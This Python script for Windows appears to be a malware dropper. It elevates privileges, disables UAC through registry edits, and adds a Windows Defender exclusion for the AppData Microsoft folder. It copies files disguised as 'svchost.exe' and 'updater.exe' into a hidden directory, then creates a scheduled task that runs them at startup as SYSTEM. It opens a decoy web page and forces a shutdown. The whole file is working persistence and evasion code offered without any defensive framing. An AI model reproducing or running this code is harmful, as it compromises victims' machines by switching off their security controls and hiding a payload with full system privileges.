import os
import shutil
import ctypes
import winreg as reg
from elevate import elevate
from webbrowser import open as open_t
import subprocess
from time import sleep

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        return False

if not is_admin():
    elevate()

def disable_uac():
    try:
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        uac_keys = {
            "EnableLUA": 0,
            "ConsentPromptBehaviorAdmin": 0,
            "ConsentPromptBehaviorUser": 0,
        }
        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE) as key:
            for name, value in uac_keys.items():
                reg.SetValueEx(key, name, 0, reg.REG_DWORD, value)
                print(f"{name} set to {value}")
    except Exception as e:
        pass

source_path_exe = 'svchost.exe'
source_updater = 'updater.exe'

appdata_path = os.path.expandvars(r"%APPDATA%\Microsoft\MS32")
destination_path_exe = os.path.join(appdata_path, 'svchost.exe')
destination_updater = os.path.join(appdata_path, 'updater.exe')

if os.path.exists(appdata_path):
    shutil.rmtree(appdata_path)
os.mkdir(appdata_path)

path = os.path.expandvars(r"%APPDATA%\Microsoft")

def run_powershell_command(command):
    try:
        result = subprocess.run(
            ["powershell", "-Command", command],
            capture_output=True,
            text=True,
            shell=True
        )
        if result.returncode != 0:
            raise Exception(result.stderr.strip())
        return result.stdout.strip()
    except Exception as e:
        return f"Error: {e}"

command = f"Add-MpPreference -ExclusionPath '{path}'"
run_powershell_command(command)

disable_uac()

try:
    shutil.copy(source_path_exe, destination_path_exe)
    print(f"File copied from {source_path_exe} to {destination_path_exe}")
    subprocess.run(["attrib","+h","+s",destination_path_exe],shell=True)
    
    shutil.copy(source_updater, destination_updater)
    print(f"File copied from {source_updater} to {destination_updater}")
    subprocess.run(["attrib","+h","+s",destination_updater],shell=True)
    subprocess.run(["attrib","+h","+s",appdata_path],shell=True)
    
    command = [
    "schtasks", "/create",
    "/tn", "Windows Service Host",
    "/tr", r"C:\Users\acer\AppData\Roaming\Microsoft\MS32\svchost.exe",
    "/sc", "ONSTART",
    "/ru", "SYSTEM",
    "/rl", "HIGHEST",
    "/NP", "/F"
    ]

    subprocess.run(command, shell=True)
    open_t("https://google.com")
    sleep(3)
    os.system("shutdown /s /t 0")
except FileNotFoundError as e:
    print("Error: Source file or folder not found.")
    print(f"Details: {e}")

except PermissionError as e:
    print("Error: Permission denied while accessing the destination.")
    print(f"Details: {e}")

except Exception as e:
    print(f"An unexpected error occurred: {e}")
